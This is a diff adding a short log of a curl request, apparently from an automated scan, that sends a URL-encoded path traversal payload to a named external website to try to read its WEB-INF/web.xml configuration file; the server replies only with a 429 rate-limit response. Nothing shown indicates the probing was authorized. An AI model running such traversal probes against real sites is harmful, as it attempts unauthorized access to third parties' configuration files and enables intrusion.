@@ -1,0 +1,9 @@
+# command: timeout 20 curl -s -m 18 -o - -w '\nHTTP_STATUS:%{http_code}' 'https://www.infinitycapital.bh/404?q=..%2F..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fweb.xml'
+# exit_code: 0
+# ---
+
+Too Many Requests
+
+Too Many Requests
+bom1::cwlql-1790749351831-9d192c860f73
+HTTP_STATUS:429
